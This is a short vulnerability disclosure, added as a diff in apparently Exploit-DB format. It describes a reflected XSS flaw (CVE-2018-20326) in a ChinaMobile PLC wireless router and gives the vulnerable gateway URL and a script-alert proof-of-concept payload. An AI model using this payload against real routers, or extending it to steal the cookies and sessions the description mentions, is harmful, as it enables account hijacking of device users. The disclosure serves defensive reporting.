@@ -1,0 +1,20 @@
+# Exploit Title: PLC Wireless Router GPN2.4P21-C-CN -Reflected XSS 
+# Date: 21/12/2018
+# Exploit Author: Kumar Saurav
+# Reference: https://0dayfindings.home.blog/2018/12/26/plc-wireless-router-gpn2-4p21-c-cn-reflected-xss/
+# Vendor: ChinaMobile
+# Category: Hardware
+# Version: GPN2.4P21-C-CN (Firmware: W2001EN-00)
+# Tested on: Multiple
+# CVE : CVE-2018-20326
+
+#Description: PLC Wireless Router's are vulnerable to a Reflected Cross Site Scripting (XSS).With this attack, the threat actor can steal cookies, session id, username or other sensitive information redirect an innocent victim to a malicious website, thus compromising the user. 
+
+Reproduction Steps:
+Step 1: Go to Wi-fi Router Gateway (192.168.59.254 in my case)
+Step 2: Login as Username and Password
+Step 3: After Login below url will be shown 
+        (http://192.168.59.254/cgi-bin/webprocgetpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:subpage=-)
+Step 4: Insert the payload "<script>alert("XSS-Saurav")</script>" at the end of the above mentinoed url and hit enter
+          (http://192.168.59.254/cgi-bin/webprocgetpage=html/index.html&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=connected&var:subpage=-<script>alert("XSS-Saurav")</script>)
+Step 5: On execution of the payload, it will be popped up  as "XSS-Saurav"
